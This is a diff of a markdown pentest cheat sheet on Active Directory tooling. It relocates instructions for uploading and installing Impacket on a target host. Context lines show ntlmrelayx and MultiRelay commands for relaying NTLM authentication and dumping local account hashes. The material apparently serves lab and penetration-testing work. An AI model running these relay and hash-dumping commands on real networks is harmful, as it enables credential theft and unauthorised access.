@@ -67,10 +67,15 @@ Rubeus
 
 ## General Tools 
 [Impacket](https://github.com/SecureAuthCorp/impacket): collection on Python classes for working with network protocols.       
+Can be finicky - you may need to uninstall / reinstall when updating.    
 
     #if not properly installed 
     apt install impacket-scripts  
     /usr/share/doc/python3-impacket/examples  
+    
+    #manual install (if inside a lab network)    
+    upload Impacket files to target and run install script    
+    sudo python3 setup.py install    
     
 [ADSC-Pwn](https://github.com/bats3c/ADCSPwn)   
 
@@ -112,9 +117,6 @@ You might need to disable the SMB or HTTP servers used by Responder to avoid con
     sudo python3 ntlmrelayx.py -tf targets -smb2support     
     sudo python3 ntlmrelayx.py -socks -smb2support -tf smb_targets.txt     
     
-    #Impacket manual install (if relaying hashes inside a network)    
-    upload https://github.com/fortra/impacket to target and run install script    
-    sudo python3 ./setup.py install    
 [MultiRelay - Built into the Responder Toolkit](https://github.com/lgandx/Responder/blob/master/tools/MultiRelay.py)     
 
     /opt/Responder/tools $ python3 MultiRelay.py -t 172.16.1.5 -u ALL -d    #Relay auth requests for all users, dump local account hashes   
